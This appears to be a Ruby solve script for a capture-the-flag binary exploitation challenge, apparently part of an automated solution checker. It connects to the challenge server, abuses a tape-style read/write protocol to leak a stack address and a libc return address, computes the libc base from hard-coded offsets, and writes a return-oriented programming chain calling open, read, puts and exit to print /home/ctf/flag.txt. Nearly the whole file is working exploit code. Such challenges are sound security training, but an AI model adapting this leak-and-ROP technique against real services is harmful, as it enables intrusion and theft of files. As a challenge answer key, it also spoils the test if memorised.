require 'socket'
require './libronsolve.rb'

# Defined in the challenge
RIGHT = '00'
LEFT  = '01'
PRINT = '10'
WRITE = '11'

# Gadgets
POP_RDI_RET = 0x27DF1
POP_RSI_RET = 0x7E5C5
POP_RCX_RET = 0x10E63a

# Offsets relative to the start of libc.so
OPEN = 0xF7EB0
READ = 0xF8190
PUTS = 0x77980
EXIT = 0x3E680

# Used to calculate other addresses
RETURN_ADDRESS = 0x2724A

host, port = get_host_port()

# Connect to the server
s = TCPSocket.new(host, port)

# Get the instructions
puts "Instructions: \"#{ [s.gets().gsub(/ /, '')].pack('B*') }\""

# Helper functions
def read_64_bits_left(s)
  c = []
  0.upto(7) do |i|
    s.write(LEFT)
    s.write(PRINT)
    c << (s.read(8).to_i(2) & 0x0FF)
  end

  return c.pack('c*').unpack('Q').pop
end

def read_64_bits_right(s)
  c = []
  0.upto(7) do |_|
    s.write(PRINT)
    s.write(RIGHT)
    c << (s.read(8).to_i(2) & 0x0FF)
  end

  return c.pack('c*').unpack('Q').pop
end

def write_64_bits_right(s, i)
  [i].pack('Q').unpack('c*').each do |b|
    s.write(WRITE + ('%08b' % (b & 0x0FF)))
    s.write(RIGHT)
  end
end

def write_8_bits_right(s, b)
  s.write(WRITE + ('%08b' % (b & 0x0FF)))
  s.write(RIGHT)
end

# Use some unused stack space to store our command for later
s.write(RIGHT * 1000)

# Write the command to the stack, one byte at a time
FILENAME = "/home/ctf/flag.txt\0"
FILENAME.bytes.each do |b|
  write_8_bits_right(s, b)
end

# Go backwards - this rewinds to a point on the stack where we can reliably find
# a stack reference
s.write(LEFT * (1000 + FILENAME.length))
s.write(RIGHT * 136)

# Read a stack address
STACK_ADDR = read_64_bits_right(s)

# Calculate where our command is, based on the known address and the 1000-byte
# offset
FILENAME_ADDR = STACK_ADDR - 0x88 + 1000
puts "Command should be @ 0x%x" % FILENAME_ADDR

# Continue to the return address
s.write(RIGHT * 24)
ACTUAL_RETURN_ADDRESS = read_64_bits_right(s)

# Go back to the start of the return address
s.write(LEFT * 8)
puts 'Return address on the stack: 0x%x' % ACTUAL_RETURN_ADDRESS

# Calculate the base address (ie, start of libc) - that'll let us figure out
# where the functions we want are
BASE_ADDRESS = (ACTUAL_RETURN_ADDRESS - RETURN_ADDRESS)
puts 'Base address: 0x%x' % BASE_ADDRESS

# Do a 3-element ROP chain - I don't know why system() isn't working, but this
# is!

# *** open(file, 0, 0)
write_64_bits_right(s, BASE_ADDRESS + POP_RDI_RET)
write_64_bits_right(s, FILENAME_ADDR)

write_64_bits_right(s, BASE_ADDRESS + POP_RSI_RET)
write_64_bits_right(s, 0)

write_64_bits_right(s, BASE_ADDRESS + POP_RCX_RET)
write_64_bits_right(s, 0)

write_64_bits_right(s, BASE_ADDRESS + OPEN)

# *** read(5, buffer)
write_64_bits_right(s, BASE_ADDRESS + POP_RDI_RET)
write_64_bits_right(s, 5)

write_64_bits_right(s, BASE_ADDRESS + POP_RSI_RET)
write_64_bits_right(s, FILENAME_ADDR)

write_64_bits_right(s, BASE_ADDRESS + POP_RCX_RET)
write_64_bits_right(s, expected_flag().length)

write_64_bits_right(s, BASE_ADDRESS + READ)

# *** puts(buffer)
write_64_bits_right(s, BASE_ADDRESS + POP_RDI_RET)
write_64_bits_right(s, FILENAME_ADDR)

write_64_bits_right(s, BASE_ADDRESS + PUTS)

# *** exit(0)
write_64_bits_right(s, BASE_ADDRESS + POP_RDI_RET)
write_64_bits_right(s, 0)

write_64_bits_right(s, BASE_ADDRESS + EXIT)

# Tell it we're quitting
s.write("q\n")

# Read the flag until we get disconnected
flag = s.read(expected_flag().length)

# Validate!
check_flag(flag, terminate: true)
